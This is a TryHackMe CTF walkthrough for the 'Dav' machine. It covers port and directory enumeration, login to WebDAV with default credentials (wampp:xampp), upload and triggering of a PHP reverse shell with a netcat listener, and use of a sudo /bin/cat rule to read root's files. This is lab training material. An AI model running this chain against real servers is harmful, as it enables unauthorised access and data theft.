# BSidesGT Dav - TryHackMe walkthrough

## Overview

Dav - boot2root machine for FIT and bsides guatemala CTF

Site: https://tryhackme.com/room/bsidesgtdav

---

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: h[ttps://github.com/garthheff/CTF-Hints/](https://github.com/garthheff/CTF-Hints/blob/main/bsidesgtdav.md)


## Nmap enumeration

We start with a full TCP port scan along with default scripts and version detection.

```bash
root@ip-10-49-66-11:~# nmap -p- -sC -sV 10.49.134.102
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-04 00:23 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.49.134.102
Host is up (0.00020s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.10 seconds
```

### Notes

- Only **port 80** is open
- The service is **Apache 2.4.18 on Ubuntu**
- The landing page is just the default Apache page, so further enumeration is required

---

## Gobuster enumeration

We enumerate the web root using Gobuster.

```bash
root@ip-10-49-66-11:~# gobuster dir -u http://10.49.134.102/ -w /usr/share/wordlists/dirb/common.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.134.102/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/webdav               (Status: 401) [Size: 460]
```

### Notes

The important result here is:

- `/webdav` returns **401 Unauthorized**

Given the room name and the response code, this strongly suggests a WebDAV directory protected by Basic Authentication.

---

## Finding working WebDAV credentials

Instead of brute forcing blindly, we checked common WebDAV default credentials and found a list here:

- https://gist.github.com/kaiquepy/fd02275785ef7c8b6e6cb308654960d9

From that list, the working credentials were:

```text
wampp:xampp
```

We can test them directly with curl:

```bash
curl -u wampp:xampp http://10.49.134.102/webdav/
```

A successful response confirms that the credentials are valid.

---

## Connecting to WebDAV with cadaver

To make WebDAV interaction easier, install `cadaver` and connect to the endpoint.

```bash
apt install cadaver
```

```bash
cadaver http://10.49.134.102/webdav/
```

Login with:

```text
wampp:xampp
```

---

## Reverse shell upload

For the shell, we used a **pentestmonkey PHP reverse shell**.

Before uploading it, edit the reverse shell so that:

- `IP` is set to your TryHackMe attacker IP
- `PORT` is set to the port you want to listen on, in this case `9001`

Then upload it through `cadaver`:

```bash
dav:/webdav/> put shell.php 
Uploading shell.php to `/webdav/shell.php':
```

---

## Start listener

Start a Netcat listener on the same port configured in the pentestmonkey PHP reverse shell.

```bash
nc -lvnp 9001
```

---

## Trigger the reverse shell

Now request the uploaded PHP file using the valid WebDAV credentials.

```bash
curl -u wampp:xampp http://10.49.134.102/webdav/shell.php
```

Once the file executes, the reverse shell connects back to our Netcat listener.

---

## User flag

After the shell connects back, enumerate users and retrieve the user flag.

```bash
-generic
$ cd /home
$ ls
merlin
wampp
$ cd merlin
$ ls
user.txt
$ cat user.txt
[REDACTED]
$
```

---

## Privilege escalation

Check which commands the current user can run with sudo.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

This means `www-data` can run `/bin/cat` as root without a password.

---

## Root flag

Use the sudo permission to read the root flag directly.

```bash
$ sudo /bin/cat /root/root.txt
[REDACTED]
```

---

## Summary

1. Enumerated the target with Nmap and found only Apache on port 80
2. Enumerated the web root with Gobuster and found `/webdav`
3. Identified working default credentials from a WebDAV default credential list
4. Authenticated to WebDAV using `wampp:xampp`
5. Uploaded a **pentestmonkey PHP reverse shell**
6. Triggered the shell and obtained command execution
7. Retrieved the user flag
8. Ran `sudo -l` and found that `www-data` could run `/bin/cat` as root
9. Read the root flag using sudo

---
